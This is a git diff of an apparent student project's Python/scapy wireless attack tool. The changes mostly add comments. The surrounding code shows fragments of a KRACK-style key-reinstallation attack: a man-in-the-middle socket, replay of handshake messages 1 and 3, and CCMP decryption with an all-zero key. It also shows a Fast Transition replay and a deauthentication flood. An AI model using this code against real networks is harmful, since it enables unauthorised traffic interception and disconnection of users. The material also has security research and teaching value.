@@ -1,5 +1,13 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-​
+#########################################
+#					#
+#     Wireless Tool - ITB.ie PROJECT	#
+#					#
+#   B00092887 | B00092915 | B00091896   #
+#					#
+#########################################
+
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.contrib.wpa_eapol import *
@@ -29,30 +37,31 @@ IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
 IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)
 
 #Pre-welcome screen to check dependencies 
+
+#checks if scapy installed
 try:
 	from scapy.all import *
 except ImportError:
         logging.warning('Scapy not installed. Please install it!')
 	exit(-1)
-
-
+#checks for correct version of io module
 if sys.version_info[0] < 3:
 	from StringIO import StringIO
 else:
 	from io import StringIO	
-
+#checks and creates working directory
 if not os.path.isdir("./scanfiles"):
 		
 	print "Creating New directory for scan files"
 	
 	os.system("mkdir ./scanfiles")
-
+#checks if user is root
 if os.geteuid() != 0:
 	exit("You need to be root to run this script!")
 
 
 
-
+# Fast Transition module for FT Attack
 class FT():
 	def __init__(self, selectedInterface, wlanXmon, mac):
 		self.detected = False
@@ -66,12 +75,12 @@ class FT():
 		self.sock  = None
 		self.reset_client()
 		log(ERROR, ("Fast Transition DETECTION STARTED "))		
-		
+		# resets values between transitions
 	def reset_client(self):
 		self.reassoc = None
 		self.ivs = IvCollection()
 		self.next_replay = None
-
+		#sets timer value for FT replay 
 	def start_replay(self, p):
 		assert Dot11ReassoReq in p
 		self.reassoc = p
@@ -123,7 +132,7 @@ class FT():
 			self.ivs.track_used_iv(p)
 		####
 	def run(self):
-		
+		#socket
 		self.sock = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)
 		
 		while True:
@@ -156,7 +165,7 @@ class FT():
 
 def cleanupFT():
 	attackFT.stop()
-
+# Fast Transition module for FT Attack
 class AttackClient():
 			
 	def __init__(self,selectedInterface, wlanXmon, target_mac,bssid ):
@@ -182,11 +191,10 @@ class AttackClient():
 		log(ERROR, (" Target MAC - ACCESS POINT: " + self.targetAPmac))			
 		log(ERROR, (" Target MAC - CLIENT STATION: " + self.targetClinetmac))	
 
-		
+	#	
 	def decrypt(self, p):
 		payload = get_ccmp_payload(p)
-		llcsnap, packet = payload[:8], payload[8:]
-
+		
 		if payload.startswith("\xAA\xAA\x03\x00\x00\x00"):
 			plaintext = payload
 			plaintext = decrypt_ccmp(p, "\x00" * 16)
@@ -333,7 +341,7 @@ class AttackClient():
 			self.track_used_iv(p)	
 
 	def run(self):
-
+		#sockets
 		self.sock_ap = L2Socket(type=ETH_P_ALL, iface=self.nic_targetAP) ### socket ap interace
 		self.sock_mon = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)  ### socket monitor
 		####
@@ -342,7 +350,7 @@ class AttackClient():
 						
 			if self.messageThree and self.messageOne and time.time() > self.next_replay:
 				
-				#TODO Make option to replay sole message 3 	
+				#TODO Make option to replay sole message 3 or (1 and 3)	
 				#self.sock_ap.send(self.messageOne)
 				#time.sleep(0.5)
 				#log(INFO, "Replaying messge 1 and 3. Number:"+ str(self.c))			
@@ -412,7 +420,7 @@ def welcome_screen():
 
 	)
 
-	#please don't laugh here | list to sting in nice order
+
 	# exception handler for input
 	while True:
 		raw_select = raw_input("\n \n \t Please select your interface: ".format(N=NORMAL, R=RED)).lower()
@@ -431,7 +439,7 @@ def welcome_screen():
 		    print("{R}ERROR: PLEASE SELECT AVAILABLE INTERFACE.{N}".format(R=RED, N=NORMAL))
 		    continue	
 
-
+#makes monitor
 def makeMonitor(selectedInterface):
 	
 	mon = 'mon'
@@ -462,7 +470,7 @@ def makeMonitor(selectedInterface):
 	
 
 	return intfmon
-	
+#performs scan	
 def makeScan(intfmon):	
 
 	if not os.path.isdir("./scanfiles"):
@@ -496,7 +504,7 @@ def makeScan(intfmon):
 			os.kill(os.getpid(),SIGINT)
 			stop_ifExist()
 			main()
-
+#put monitor in specific channel
 def monitor_channel(channel,intfmon,selectedInterface):
 	#try:
 	subprocess.call(["iw", intfmon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -508,13 +516,13 @@ def monitor_channel(channel,intfmon,selectedInterface):
 	subprocess.check_output(["iw", intfmon, "set", "channel", channel])
 	time.sleep(0.5)
 	subprocess.check_output(["ifconfig", intfmon, "up"])	
-	
+#set managed interface to specific channel 	
 def maininterface_channel(channel, selectedInterface):
 	#try:
 	subprocess.check_output(["ifconfig", selectedInterface, "down"])	
 	subprocess.check_output(["iw", selectedInterface, "set", "channel", channel])
 	subprocess.check_output(["ifconfig", selectedInterface, "up"])	
-	
+#reset managed interface	
 def maininterface_reset(selectedInterface):
 	#try:
 	subprocess.check_output(["ifconfig", selectedInterface, "down"])	
@@ -525,7 +533,7 @@ def maininterface_reset(selectedInterface):
 	subprocess.call(["iw", "temp", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 	time.sleep(0.5)
 	subprocess.check_output(["ifconfig", selectedInterface, "up"])
-
+#scan on channel
 def rescan_on_channel(channel,intfmon,selectedInterface):
 		
 	if os.path.isdir("/sys/class/net/" + intfmon):
@@ -566,7 +574,7 @@ def rescan_on_channel(channel,intfmon,selectedInterface):
 			main()
 	# put monitor back in "non channel specific" mode
 	makeMonitor(selectedInterface)
-
+#scan for assosiated stations
 def rescan_with_station(station,intfmon,selectedInterface ):	
 	
 	bssid = stationslist[station][1]
@@ -599,7 +607,7 @@ def rescan_with_station(station,intfmon,selectedInterface ):
 	#puts monitor in "non channel specyfic"
 	makeMonitor(selectedInterface)
 	return bssid, essid, channel
-
+# pulls data from the csv file
 def read_latest():
 #check for the latest scan in scaning folder
 	
@@ -638,7 +646,7 @@ def read_latest():
 	#enumerates station list, builds target selection list	
 	for c, line in enumerate(clients_list):
 		clientslist.append([c ,line[0],line[2],line[3],line[6]])
-
+#prints output
 def print_stations():
 	clear_screen()	
 	read_latest()	
@@ -671,7 +679,7 @@ def print_clients(bssid, essid, channel):
 	for line in clientslist:
 		print (line)
 	
-
+#main menu options
 def main_menu():	
 	
 	global main_option
@@ -706,7 +714,7 @@ def main_menu():
 	    else:
 		print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
 		continue
-
+#select channel prompt
 def select_channel():
 
 	print (HEADER + '''
@@ -731,7 +739,7 @@ def select_channel():
 	    else:
 		print("{R}ERROR: Option is invalid. NUMBERS FROM 1 - 11.{N}".format(R=RED, N=NORMAL))
 		continue
-
+#select prompt 
 def select_station():
 
 	print (HEADER + '''
@@ -759,7 +767,7 @@ def select_station():
 		print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
 		continue
 
-
+#select prompt
 def select_client():
 
 	print (HEADER + '''
@@ -803,7 +811,7 @@ def select_client():
 				else:
 					print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
 					continue
-
+#prints whitelisted clients
 def print_whitelist():
 	
 	clear_screen()
@@ -815,7 +823,7 @@ def print_whitelist():
 	#TODO remove position zero from the list	
 	for line in whitelist:
 		print (line)	
-	
+#adds second to whitelist 	
 def whitelist_add_another():
 	
 	clear_screen()	
@@ -853,7 +861,7 @@ def whitelist_add_another():
 		print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
 		continue
 	
-
+#add to whitelist remove from station list 
 def add_to_white_list(client):
 	
 	white_list = []
@@ -878,7 +886,7 @@ def add_to_white_list(client):
 
 	for c, line in enumerate(stations_list):
 		stationslist.append([c ,line[0], line[1],line[2],line[3],line[4],line[5],line[6]])
-
+#prompt whitelist 
 def whitelist_client():		
 	
 	clear_screen()
@@ -914,6 +922,7 @@ def whitelist_client():
 			print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
 
 			continue
+#gets Mac address
 def get_Target_Mac(target_client):
 
 	if target_client <=20: #TODO change this 
@@ -925,10 +934,7 @@ def get_Target_Mac(target_client):
 	else:
 		if target_client.count(":")==5:
         		return target_client
-			
-	
-
-
+#deauth function
 def deauth_client(target_client,intfmon,bssid):
 	
 	count = 50 # The number of deauth packets you want to send
@@ -1068,7 +1074,7 @@ def interfaces():
 
 	# return list
 	return interfaceslist
-
+#main function 
 def main():		
 	global wlanXmon, selectedInterface, attackFT 
 	OScheck()
